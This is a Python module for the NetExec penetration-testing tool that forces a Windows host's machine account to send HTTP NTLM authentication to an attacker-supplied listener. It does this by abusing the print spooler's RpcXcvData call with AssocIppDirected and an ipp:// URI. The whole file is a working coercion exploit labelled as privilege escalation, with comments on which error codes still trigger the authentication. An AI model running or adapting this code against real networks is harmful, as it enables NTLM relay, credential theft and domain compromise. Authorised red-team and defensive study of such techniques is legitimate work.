#!/usr/bin/env python3
# coerce_ipp.py
#
# Coerce machine-account HTTP NTLM auth via directed IPP
# (remote equivalent of BOF-coerce-ipp / AssocIppDirected)
#
# Usage:
#   nxc smb <target> -u user -p pass -M coerce_ipp -o LISTENER=<ip>
#   nxc smb <target> -u user -p pass -M coerce_ipp -o LISTENER=<ip> PORT=8080

from impacket.dcerpc.v5 import transport, rprn
from impacket.dcerpc.v5.ndr import NDRCALL, NDRUniConformantArray
from impacket.dcerpc.v5.dtypes import DWORD, ULONG, NULL, WSTR
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.dcerpc.v5.rpcrt import DCERPCException

try:
    from nxc.helpers.misc import CATEGORY
    HAS_CATEGORY = True
except ImportError:
    HAS_CATEGORY = False


class BYTE_ARRAY(NDRUniConformantArray):
    item = "c"


class RpcXcvData(NDRCALL):
    opnum = 88
    structure = (
        ("hXcv", rprn.PRINTER_HANDLE),
        ("pszDataName", WSTR),
        ("pInputData", BYTE_ARRAY),
        ("cbInputData", DWORD),
        ("cbOutputData", DWORD),
        ("pdwStatus", DWORD),
    )


class RpcXcvDataResponse(NDRCALL):
    structure = (
        ("pOutputData", BYTE_ARRAY),
        ("pcbOutputNeeded", DWORD),
        ("pdwStatus", DWORD),
        ("ErrorCode", ULONG),
    )


class NXCModule:
    name = "coerce_ipp"
    description = "Coerce machine HTTP NTLM via directed IPP (WSD / AssocIppDirected)"
    supported_protocols = ["smb"]
    opsec_safe = False
    multiple_hosts = True
    if HAS_CATEGORY:
        category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self):
        self.listener = None
        self.port = 80
        self.uri_path = "/ipp/print"

    def options(self, context, module_options):
        """
        LISTENER / L    IP of HTTP NTLM listener (required)
        PORT            Listener port (default 80)
        PATH            URI path (default /ipp/print)
        """
        if "LISTENER" in module_options:
            self.listener = module_options["LISTENER"]
        if "L" in module_options:
            self.listener = module_options["L"]
        if "PORT" in module_options:
            self.port = int(module_options["PORT"])
        if "PATH" in module_options:
            self.uri_path = module_options["PATH"]

        if self.listener is None:
            context.log.fail("LISTENER (or L) is required")
            return False

    def on_login(self, context, connection):
        target = connection.remoteName
        context.log.display(f"Attempting remote IPP/WSD coercion toward {self.listener}:{self.port}")

        dce = self._connect(connection, target)
        if dce is None:
            context.log.fail("Could not bind to MS-RPRN")
            return

        # Working name form confirmed on Server 2022
        monitor_name = f"\\\\{target}\\,XcvMonitor WSD Port\x00"

        try:
            resp = rprn.hRpcOpenPrinter(
                dce,
                monitor_name,
                pDatatype=NULL,
                pDevModeContainer=NULL,
                accessRequired=0x00000001,  # SERVER_ACCESS_ADMINISTER
            )
            hXcv = resp["pHandle"]
        except Exception as e:
            context.log.fail(f"Could not open XcvMonitor WSD Port handle: {e}")
            try:
                dce.disconnect()
            except Exception:
                pass
            return

        uri = f"ipp://{self.listener}:{self.port}{self.uri_path}"
        uri_bytes = (uri + "\x00").encode("utf-16le")

        try:
            request = RpcXcvData()
            request["hXcv"] = hXcv
            request["pszDataName"] = "AssocIppDirected\x00"
            request["pInputData"] = uri_bytes
            request["cbInputData"] = len(uri_bytes)
            request["cbOutputData"] = 0
            request["pdwStatus"] = 0

            resp = dce.request(request)
            status = resp["pdwStatus"]
            err = resp["ErrorCode"]

            # 0xbc4 (ERROR_INVALID_PARAMETER) is commonly returned but still triggers the auth
            if err == 0 or status in (0, 0xbc4):
                context.log.success(f"Triggered AssocIppDirected → {uri}")
            else:
                context.log.highlight(
                    f"RpcXcvData status=0x{status:x} ErrorCode=0x{err:x} "
                    "(check listener – auth may still have been sent)"
                )
        except Exception as e:
            # Many failures still result in the machine account connecting
            context.log.highlight(f"RpcXcvData exception (auth may still occur): {e}")
        finally:
            try:
                rprn.hRpcClosePrinter(dce, hXcv)
            except Exception:
                pass
            try:
                dce.disconnect()
            except Exception:
                pass

    def _connect(self, connection, target):
        stringBinding = rf"ncacn_np:{target}[\PIPE\spoolss]"
        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        rpctransport.set_credentials(
            connection.username,
            connection.password,
            connection.domain,
            connection.lmhash,
            connection.nthash,
            getattr(connection, "aesKey", None),
        )
        if getattr(connection, "kerberos", False):
            rpctransport.set_kerberos(
                connection.kerberos, kdcHost=getattr(connection, "kdcHost", None)
            )
        rpctransport.setRemoteHost(target)

        dce = rpctransport.get_dce_rpc()
        if getattr(connection, "kerberos", False):
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

        try:
            dce.connect()
            dce.bind(rprn.MSRPC_UUID_RPRN)
            return dce
        except Exception:
            return None
